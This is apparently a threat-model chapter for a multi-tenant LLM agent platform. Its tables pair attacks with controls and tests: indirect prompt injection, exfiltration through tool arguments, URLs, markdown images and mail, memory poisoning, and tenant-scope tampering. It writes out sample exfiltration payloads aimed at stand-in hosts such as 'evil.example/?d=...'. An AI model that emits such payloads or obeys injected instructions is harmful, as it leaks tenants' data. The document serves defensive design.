# 05 · Threat model

## In one glance
- The model can only leak what it can read: its tenant's data.
- No tenant selector is ever model input, so scope cannot move.
- Same tenant exfil is contained; prompts never leave Hetzner.

Rule: [00-overview](00-overview.md#the-rule-fail-closed). Layers: E edge, A app, D database, K keys, N network.

## Hostile model
| # | Threat | Attack path | Control | Layer | Why the model cannot bypass | Test |
|---|---|---|---|---|---|---|
| T1 | Indirect prompt injection | Instructions hidden in doc, mail, ticket, page | Retrieved text wrapped as labelled data; tools bound to tenant | A | Obeying it only reaches the invoking tenant | Injection corpus run per release |
| T2 | Exfil via tool arguments | Secrets packed into a search or API argument | Per agent tool allow list; per tenant domain allow list | A, N | Proxy drops hosts off list; no route around it | Corpus asks tool to hit canary host |
| T3 | Exfil via fetched URL | Model asks fetch tool for `evil.example/?d=...` | Smokescreen allow list; nftables drops direct egress | N | Network rule, not a prompt rule | Fetch to non listed host must fail |
| T4 | Exfil via markdown image | Model emits `![](https://evil/?d=...)` in chat | UI renders no remote images; links not auto followed | A (UI) + CSP | Browser CSP `img-src 'self'` blocks request | Playwright test asserts zero outbound requests |
| T5 | Exfil via mail or message | Model sends data to attacker address | Recipient allow list signed off by tenant admin, audited; send needs approval | A | Recipient checked in code after model output | Send to non listed address returns error |
| T6 | Memory poisoning | Model writes instructions into long term memory | Writes carry provenance; recall returns data, never system prompt | A, D | Recalled text cannot reach the system role | Poisoned memory row must not change tool calls |
| T7 | Scope change via tool params | Model passes `tenant_id`, connection id, schema, namespace | Schemas expose business args only; binding comes from DI | A | The parameter does not exist to set | Schema snapshot test: no scope fields |
| T8 | Cross tenant vector read | Query with weakened or missing filter | pgvector rows under the same FORCED RLS; `hnsw.iterative_scan = relaxed_order` | D | Filter lives in Postgres, not the query | B canary never returned; recall@10 floor in CI |
| T16 | KV cache side channel | Timing reveals another tenant's cached prompt prefix | `cache_salt` = HMAC(tenant_id), SHA256 block hash, V1 engine | Model server | Gateway sets salt; model never sees it | Timing probe fails: caching switched off |
| T17 | Model server calls out | Compromised inference host phones home | srv-gpu has no egress; weights baked at provision | N | No route exists | Outbound probe from srv-gpu fails |

## Platform and people
| # | Threat | Attack path | Control | Layer | Why the model cannot bypass | Test |
|---|---|---|---|---|---|---|
| T9 | Missing tenant predicate | Developer ships raw SQL without `WHERE tenant_id` | RLS policy filters regardless of SQL text | D | Model never writes SQL | Raw query under tenant A sees zero B rows |
| T10 | Stale pooled session | PgBouncer reuses connection from previous tenant | `set_config(..., true)` is transaction local; unset means zero rows | D | Model never touches connections | Query with no tenant set returns zero rows |
| T11 | Unset or empty setting | `current_setting` returns NULL or `''` | `NULLIF(current_setting('app.tenant_id', true), '')::uuid` | D | Not reachable from prompt | Policy unit test for NULL and `''` |
| T12 | Operator mistake | Migration drops FORCE, or ad hoc query as owner | CI asserts `relforcerowsecurity` on tenant tables; operators audited | D, ops | Not reachable from prompt | Catalog check fails pipeline |
| T13 | Unbound webhook | Event arrives without tenant binding | Tenant resolved from per connection secret path plus signature | E | Payload tenant fields are ignored | Unsigned or unknown path returns 404 |
| T14 | Tampered job payload | Queue job carries edited tenant id | Envelope signed at enqueue; worker rebuilds context from envelope | A | Model output never writes the envelope | Re-signed job with other tenant rejected |
| T15 | Cache key collision | Valkey key built without prefix | One key builder from TenantContext; values sealed with tenant key | A, K | Wrong key decrypts to nothing | Cross prefix read yields ciphertext only |
| T18 | Hostile MCP client | n8n or AI assistant workflow writes poisoned memory or asks other tenant | MCP endpoint takes tenant from OAuth token only; writes tagged with client | E, A | Tenant id is not an MCP argument | MCP call with tenant A token never sees B canary |
| T19 | Runaway tenant | Compromised agent loops, burns tokens, hammers egress | Per tenant quota; auto quarantine: revoke tokens, pause jobs, close egress | A, N | Trigger is metrics, not model output | Synthetic runaway tenant gets quarantined; others unaffected |

## Decisions
| Decision | Alternative | Why it lost |
|---|---|---|
| Iterative HNSW scan; big tenants get own partition and index | Exact scan always | Too slow past ~100k rows per tenant (unverified) |
| Prefix cache on only while T16 probe passes | Always on with salt | vLLM calls salt a trust group, not a guarantee |
| Tenant admin owns recipient allow list | Operator owns it | Operator would see tenant contacts; breaks B2 |

## Open questions
- `hnsw.max_scan_tuples` stays 20,000 until recall data says otherwise.
- Partition a tenant when recall@10 drops below 0.9.
- Send tools need approval; tenant admin may waive per agent.
